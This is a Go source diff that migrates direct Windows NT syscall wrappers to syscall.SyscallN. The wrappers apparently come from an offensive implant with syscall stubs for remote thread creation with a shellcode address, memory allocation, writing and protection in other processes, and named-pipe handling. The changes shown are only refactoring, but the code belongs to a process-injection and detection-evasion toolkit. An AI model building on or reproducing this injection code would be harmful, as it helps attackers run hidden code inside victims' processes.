@@ -326,7 +326,7 @@ func syscallNtCreateThreadEx(sm *syscallManager, hProc uintptr, shellcodeAddr ui
 		}
 	}
 	var hThread uintptr
-	r1, _, _ := syscall.Syscall12(stub, 11,
+	r1, _, _ := syscall.SyscallN(stub,
 		uintptr(unsafe.Pointer(&hThread)),
 		0x1FFFFF,      // DesiredAccess
 		0,             // ObjectAttributes
@@ -356,7 +356,7 @@ func syscallNtAllocateVirtualMemory(sm *syscallManager, hProc uintptr, size uint
 	}
 	var baseAddr uintptr
 	var regionSize uintptr = size
-	r1, _, _ := syscall.Syscall6(stub, 6,
+	r1, _, _ := syscall.SyscallN(stub,
 		hProc,
 		uintptr(unsafe.Pointer(&baseAddr)),
 		0,
@@ -379,7 +379,7 @@ func syscallNtFreeVirtualMemory(sm *syscallManager, hProc uintptr, baseAddr uint
 		}
 	}
 	var regionSize uintptr = 0
-	r1, _, _ := syscall.Syscall6(stub, 4,
+	r1, _, _ := syscall.SyscallN(stub,
 		hProc,
 		uintptr(unsafe.Pointer(&baseAddr)),
 		uintptr(unsafe.Pointer(&regionSize)),
@@ -402,7 +402,7 @@ func syscallNtProtectVirtualMemory(sm *syscallManager, hProc uintptr, baseAddr u
 	}
 	var regionSize uintptr = size
 	var oldProtect uint32
-	r1, _, _ := syscall.Syscall6(stub, 5,
+	r1, _, _ := syscall.SyscallN(stub,
 		hProc,
 		uintptr(unsafe.Pointer(&baseAddr)),
 		uintptr(unsafe.Pointer(&regionSize)),
@@ -425,7 +425,7 @@ func syscallNtWriteVirtualMemory(sm *syscallManager, hProc uintptr, destAddr uin
 		}
 	}
 	var bytesWritten uintptr
-	r1, _, _ := syscall.Syscall6(stub, 5,
+	r1, _, _ := syscall.SyscallN(stub,
 		hProc,
 		destAddr,
 		uintptr(unsafe.Pointer(&data[0])),
@@ -458,7 +458,7 @@ func syscallNtOpenProcess(sm *syscallManager, desiredAccess uint32, pid uint32) 
 	}{}
 	objAttr.length = uint32(unsafe.Sizeof(objAttr))
 
-	r1, _, _ := syscall.Syscall6(stub, 4,
+	r1, _, _ := syscall.SyscallN(stub,
 		uintptr(unsafe.Pointer(&hProc)),
 		uintptr(desiredAccess),
 		uintptr(unsafe.Pointer(&objAttr)),
@@ -479,7 +479,7 @@ func syscallNtClose(sm *syscallManager, handle uintptr) error {
 			return err
 		}
 	}
-	r1, _, _ := syscall.Syscall(stub, 1, handle, 0, 0)
+	r1, _, _ := syscall.SyscallN(stub, handle, 0, 0)
 	if r1 != 0 {
 		return fmt.Errorf("NtClose failed: 0x%X", r1)
 	}
@@ -501,7 +501,7 @@ func syscallNtDelayExecution(sm *syscallManager, alertable bool, delayInterval *
 	if alertable {
 		alert = 1
 	}
-	r1, _, _ := syscall.Syscall(stub, 2,
+	r1, _, _ := syscall.SyscallN(stub,
 		alert,
 		uintptr(unsafe.Pointer(delayInterval)),
 		0,
@@ -636,7 +636,7 @@ func syscallNtCreateNamedPipeFile(sm *syscallManager, pipeName string, maxInstan
 	createOnce := func(oa *ntObjectAttributes) (uintptr, uintptr) {
 		var iosb ntIoStatusBlock
 		var handle uintptr
-		r1, _, _ := syscall.Syscall15(stub, 14,
+		r1, _, _ := syscall.SyscallN(stub,
 			uintptr(unsafe.Pointer(&handle)),  // FileHandle (out)
 			0xC0000000,                        // DesiredAccess: GENERIC_READ | GENERIC_WRITE
 			uintptr(unsafe.Pointer(oa)),       // ObjectAttributes
@@ -690,7 +690,7 @@ func syscallNtOpenPipe(sm *syscallManager, pipeName string) (uintptr, error) {
 	var iosb ntIoStatusBlock
 	var handle uintptr
 
-	r1, _, _ := syscall.Syscall6(stub, 6,
+	r1, _, _ := syscall.SyscallN(stub,
 		uintptr(unsafe.Pointer(&handle)), // FileHandle (out)
 		0xC0000000,                       // DesiredAccess: GENERIC_READ | GENERIC_WRITE
 		uintptr(unsafe.Pointer(oa)),      // ObjectAttributes
@@ -717,7 +717,7 @@ func syscallNtFsControlListen(sm *syscallManager, handle uintptr) error {
 
 	var iosb ntIoStatusBlock
 
-	r1, _, _ := syscall.Syscall12(stub, 10,
+	r1, _, _ := syscall.SyscallN(stub,
 		handle,                         // FileHandle
 		0,                              // Event (none, synchronous)
 		0,                              // ApcRoutine
@@ -752,7 +752,7 @@ func syscallNtReadPipe(sm *syscallManager, handle uintptr, buf []byte) (int, err
 
 	var iosb ntIoStatusBlock
 
-	r1, _, _ := syscall.Syscall9(stub, 9,
+	r1, _, _ := syscall.SyscallN(stub,
 		handle,                           // FileHandle
 		0,                                // Event
 		0,                                // ApcRoutine
@@ -785,7 +785,7 @@ func syscallNtWritePipe(sm *syscallManager, handle uintptr, data []byte) (int, e
 
 	var iosb ntIoStatusBlock
 
-	r1, _, _ := syscall.Syscall9(stub, 9,
+	r1, _, _ := syscall.SyscallN(stub,
 		handle,                            // FileHandle
 		0,                                 // Event
 		0,                                 // ApcRoutine
